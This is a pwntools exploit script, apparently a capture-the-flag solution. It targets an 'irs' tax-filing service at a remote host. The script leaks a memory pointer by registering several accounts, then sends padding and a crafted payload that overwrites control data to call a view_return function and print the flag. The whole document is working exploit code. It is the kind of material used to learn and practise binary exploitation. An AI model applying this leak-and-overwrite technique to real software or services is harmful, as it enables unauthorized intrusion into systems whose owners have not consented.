#!/usr/bin/env python

from pwn import *

# x = process(["./irs.fdcb32492e18be0af53449cee097327b58e542f640df440dfa5097fa567bd094"])
x = remote('irs.pwn.republican', '4127')

def info_leak():
  for i in range(4):
    x.sendline("1")
    x.sendline("name" + str(i))
    x.sendline("pass" + str(i))
    x.sendline("1")
    x.sendline("2")

  x.sendline("1")
  x.recvuntil("If this problem persists, contact us at this address: ")
  return int(x.recv(10), 16)

def exploit():
  x.sendline("3")
  x.sendline("name0")
  x.sendline("pass0")
  x.sendline("1")
  x.send("BBBBAAAAAAAAAAAAAAAAAAAAAAAAA")

  payload  = p32(0x0804892c) # view_return(**taxes, i)
  payload += p32(0x44444444) # .. whatever
  payload += p32(ptr)        # **taxes
  payload += p32(0x0)        # i
  x.sendline(payload)

ptr = info_leak()
log.info("Leaked pointer: 0x%x" % ptr)

exploit()
x.recvuntil('Password: ')
log.info("Flag: %s" % x.recvline())
